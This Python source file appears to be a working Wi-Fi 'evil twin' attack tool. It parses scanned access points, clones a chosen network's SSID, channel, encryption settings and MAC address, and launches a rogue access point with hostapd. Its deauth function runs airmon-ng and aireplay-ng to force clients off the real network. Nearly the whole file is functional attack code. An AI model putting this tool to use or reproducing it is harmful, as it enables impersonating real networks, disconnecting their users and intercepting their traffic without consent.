from utils import exec_sync
from interface import down_interface, up_interface
import os

# location of various fields in each line of csv file
bssid_index = 0
chan_index = 3
priv_index = 5
ciph_index = 6
ssid_index = 13

# metadata for hostapd.conf
driver = "nl80211"

# list of access points
ssid_list = []

# creates a list of the found access points
def make_ssid_list():
    global ssid_list
    ssid_list = []
    with open("test-01.csv", "r") as csv_file:
        for line in csv_file:
            if "ESSID" in line:
                continue
            separated_line = line.split(",")
            if len(separated_line) >= ssid_index:
                # skip blank lines
                ssid = separated_line[ssid_index]
                if len(ssid) <= 1 or len(ssid) > 32:
                    continue
                ssid_list.append(separated_line)

# gets user choice input
def get_input(prompt, count):
    choice = 1000
    while True:
        try:
            choice = int(input(prompt))
            if choice > count or choice < 1:
                raise ValueError
            break
        except ValueError:
            print("\nThat's not a valid choice. Please try again.")
    return choice

# sends broadcast deauth packets to chosen access_point
def deauth(ap_id,interface):
    ap = ssid_list[ap_id-1]
    ap_ssid = ap[ssid_index].strip()
    mac = ap[bssid_index].strip()
    channel = ap[chan_index].strip()

    # airmon-ng check kill
    exec_sync(["airmon-ng", "check", "kill"],
              "Executing `airmon-ng check kill`... ",
              "Error: failed to kill conflicting processes.",
              "Done.")
    
    #start airmon-ng
    exec_sync(['airmon-ng', 'start', interface],
              "Switching {0} to monitor mode... ".format(interface),
              "Error: could not switch {0} to monitor mode using `airmon-ng start {0}`".format(interface),
              "Done.")

    #switch wireless card channel to target channel so aireplay will work
    exec_sync(['iwconfig', interface+'mon', 'channel', channel],
              "Switching channel of {0} to target channel... ".format(interface),
              "Error: could not switch {0} to target channel".format(interface),
              "Done.")

    #run aireplay attack
    exec_sync(["aireplay-ng", "-0", "1" ,"-a", mac, interface+"mon"],
              "Deauthing clients currently connected to {0}... ".format(ap_ssid),
              "Error: failed to deauth clients.",
              "Done.")

    #stop airmon-ng
    exec_sync(['airmon-ng', 'stop', interface + "mon"],
              "Stopping {0} monitor mode... ".format(interface + "mon"),
              "Error: could not stop {0} monitor mode using `airmon-ng stop {0}`".format(interface  + "mon"),
              "Done.")

# choose an access_point from the list of found access points
def choose_access_point():
    make_ssid_list()
    
    print("Access points found:")
    print("====================")
    line_num = 1
    for line in ssid_list:
        print("{num}) {line}".format(num = line_num, line = line[ssid_index]))
        line_num += 1

    # -1 is for 1-based indexing...
    print(" ")
    choice = get_input("Which one would you like to mimic?\n", line_num-1)
    ap = ssid_list[choice-1]
    ap_ssid = ap[ssid_index]
    print("\nSelected access point: {ap}\n".format(ap = ap_ssid))
    ap_priv = ap[priv_index].strip()

    # set up the password if there is one
    if ap_priv != "OPN":
        print("This network appears to be encrypted.")
        while True:
            ap_pass = input("Enter the password for the access point.\n")
            if len(ap_pass) < 8:
                print("\nPassword must be at least 8 characters")
            elif len(ap_pass) > 64:
                print("\nPassword must be at most 64 characters")
            else:
                print("\nUsing {pwd} as password.\n".format(pwd = ap_pass))
                ap.append(ap_pass)
                break
    return choice

# updates hostapd.conf with the new access point
def make_hostapd_conf(ap_id, interface):
    ap = ssid_list[ap_id-1]
    ap_ssid = ap[ssid_index].strip()
    ap_chan = ap[chan_index].strip()
    print("Creating hostapd.conf for access point {ap}...".format(ap = ap_ssid), end="")

    # removes existing hostapd.conf
    if os.path.exists("hostapd.conf"):
        os.remove("hostapd.conf")

    with open("hostapd.conf", "w") as hostapd_conf:
        hostapd_conf.write("#basic configurations\n")
        hostapd_conf.write("interface={intf_name}\n".format(intf_name = interface))
        hostapd_conf.write("driver={drvr_name}\n".format(drvr_name = driver))
        hostapd_conf.write("ssid={ssid}\n".format(ssid = ap_ssid))
        hostapd_conf.write("channel={chan}\n".format(chan = ap_chan))
        hostapd_conf.write("hw_mode=g\n")

        # for encryption configurations
        ap_priv = ap[priv_index].strip()
        if ap_priv != "OPN":
            hostapd_conf.write("\n#WPA configurations\n")
            # set privacy flag; doesn't support WEP
            if ap_priv == "WPA":
                hostapd_conf.write("wpa=1\n")
            elif ap_priv == "WPA2":
                hostapd_conf.write("wpa=2\n")
            else:
                hostapd_conf.write("wpa=3\n")
            hostapd_conf.write("wpa_passphrase={pwd}\n".format(pwd = ap[len(ap)-1]))
            hostapd_conf.write("wpa_key_mgmt=WPA-PSK\n")
            # set authentication protocols; only supports TKIP and CCMP
            if ap_priv == "WPA" or ap_priv == "WPA2 WPA" and ap[ciph_index].strip() == "CCMP": 
                hostapd_conf.write("wpa_pairwise=CCMP\n")
            elif ap_priv == "WPA" or ap_priv == "WPA2 WPA":
                hostapd_conf.write("wpa_pairwise=TKIP\n")
            if "WPA2" in ap_priv:
                hostapd_conf.write("rsn_pairwise=CCMP\n")
    print("Done.")

# change MAC address to match AP's host
def clone_mac(ap_id, interface):
    ap = ssid_list[ap_id-1]
    mac = ap[bssid_index].strip()
    # can't change MAC with interface up
    down_interface(interface)
    exec_sync(["macchanger", "-m", mac, interface],
              "Cloning MAC address...\n",
              "\nError: could not change MAC address for interface {intf}".format(intf = interface),
              "Done", silent=False)
    up_interface(interface)

# executes hostapd to spawn the access point
def execute_hostapd():
    exec_sync(['hostapd', './hostapd.conf'],
              "Hosting access point...",
              "\nError: hostapd shutdown unexpectedly",
              "Done", silent=False)

# returns MAC to normal
def reset_mac(interface):
    exec_sync(["macchanger", "--permanent", interface],
              "Resetting MAC address...\n",
              "\nError: could not change MAC address for interface {intf}".format(intf = interface),
              "Done", silent = False)

if __name__ == "__main__":
    make_ssid_list()
    ap_id = choose_access_point()
    make_hostapd_conf(ap_id, "wlan0")
    clone_mac(ap_id, "wlan0")
    execute_hostapd()
